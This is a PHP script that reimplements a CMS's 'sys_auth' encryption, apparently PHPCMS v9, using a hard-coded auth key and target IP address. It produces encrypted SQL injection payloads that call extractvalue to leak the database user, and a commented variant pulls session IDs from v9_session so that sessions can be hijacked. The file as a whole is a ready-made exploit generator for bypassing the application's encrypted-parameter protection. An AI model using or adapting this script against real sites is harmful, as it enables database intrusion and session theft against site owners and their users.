<?php
/**
* 字符串加密、解密函数
*
*
* @param    string    $txt        字符串
* @param    string    $operation    ENCODE为加密，DECODE为解密，可选参数，默认为ENCODE，
* @param    string    $key        密钥：数字、字母、下划线
* @param    string    $expiry        过期时间
* @return    string
*/
function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
    $ckey_length = 4;
    $key = md5($key != '' ? $key : "4sUeVkLdmNZYGu2bPshg");
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

    $cryptkey = $keya.md5($keya.$keyc);
    $key_length = strlen($cryptkey);

    $string = $operation == 'DECODE' ? base64_decode(strtr(substr($string, $ckey_length), '-_', '+/')) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string);

    $result = '';
    $box = range(0, 255);

    $rndkey = array();
    for($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }

    for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }

    for($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }

    if($operation == 'DECODE') {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc.rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
    }
}

$auth_key = "wR67aGYF4kOghES5NKG1";
$ip = "123.59.214.3";
function get_auth_key($prefix,$suffix="") {
    global $auth_key;
    global $ip;
    if($prefix=='login'){
        $pc_auth_key = md5($auth_key.$ip);
    }else if($prefix=='email'){
        $pc_auth_key = md5($auth_key);
    }else{
        $pc_auth_key = md5($auth_key.$suffix);
    }
    $authkey = md5($prefix.$pc_auth_key);
    return $authkey;
}

$auth_key2 = get_auth_key('login');
$sql = "1' and (extractvalue(1,concat(0x7e,(select user()))));#\txx";
#$sql = "1' and (extractvalue(1,concat(0x7e,(select sessionid from v9_session))));#\tokee";
$sql = sys_auth($sql,'ENCODE',$auth_key2);
echo sys_auth($sql,'ENCODE',$auth_key);

echo "\n";
echo sys_auth('1','ENCODE',$auth_key);

// echo sys_auth('3d1bj3Vdx7JEQ6XakmlhBiUiEYBo7Ff3XMV2qrSu','DECODE',$auth_key);